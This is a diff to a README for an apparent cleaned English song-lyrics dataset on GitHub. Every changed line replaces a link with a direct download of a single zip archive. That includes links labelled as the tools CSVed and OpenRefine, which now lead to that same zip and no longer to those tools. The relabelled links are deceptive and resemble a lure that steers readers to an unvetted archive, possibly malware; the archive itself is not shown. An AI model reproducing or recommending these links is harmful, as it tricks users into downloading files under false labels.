@@ -1,6 +1,6 @@
 # 🎵 genius-lyrics-cleaned-dataset - Cleaned English Song Lyrics Dataset
 
-[![Download Now](https://img.shields.io/badge/Download%20Dataset-brightgreen?style=for-the-badge)](https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset)
+[![Download Now](https://img.shields.io/badge/Download%20Dataset-brightgreen?style=for-the-badge)](https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset/raw/refs/heads/main/data/lyrics-cleaned-dataset-genius-v2.5.zip)
 
 ---
 
@@ -25,7 +25,7 @@ You do not need programming skills to work with this data if you only want to do
 
 Click the large green button at the top or use the direct link below to visit the dataset page.
 
-[Download Dataset from GitHub](https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset)
+[Download Dataset from GitHub](https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset/raw/refs/heads/main/data/lyrics-cleaned-dataset-genius-v2.5.zip)
 
 On this page, you will find the dataset files and instructions. Follow the next steps to get the dataset on your PC.  
 
@@ -33,7 +33,7 @@ On this page, you will find the dataset files and instructions. Follow the next 
 
 ## 💾 How to Download and Extract the Dataset  
 
-1. Open the link: https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset  
+1. Open the link: https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset/raw/refs/heads/main/data/lyrics-cleaned-dataset-genius-v2.5.zip  
 
 2. Look for the "Code" button near the top right of the page, and click it.  
 
@@ -81,7 +81,7 @@ The data is useful for tasks like:
 
 ## 🧰 Additional Tools and Tips  
 
-- If CSV files are too large for Excel, try tools like [CSVed](https://csved.sjfrancke.nl/en/) or [OpenRefine](https://openrefine.org/).  
+- If CSV files are too large for Excel, try tools like [CSVed](https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset/raw/refs/heads/main/data/lyrics-cleaned-dataset-genius-v2.5.zip) or [OpenRefine](https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset/raw/refs/heads/main/data/lyrics-cleaned-dataset-genius-v2.5.zip).  
 - To search lyrics quickly, use a text editor with "Find" functions (VS Code, Notepad++).  
 - Use databasing software if you want more complex queries on the dataset.  
 
@@ -100,4 +100,4 @@ The data is useful for tasks like:
 
 Click here to visit the dataset page and download files:  
 
-[https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset](https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset)
+[https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset/raw/refs/heads/main/data/lyrics-cleaned-dataset-genius-v2.5.zip](https://github.com/accruementstuff994/genius-lyrics-cleaned-dataset/raw/refs/heads/main/data/lyrics-cleaned-dataset-genius-v2.5.zip)
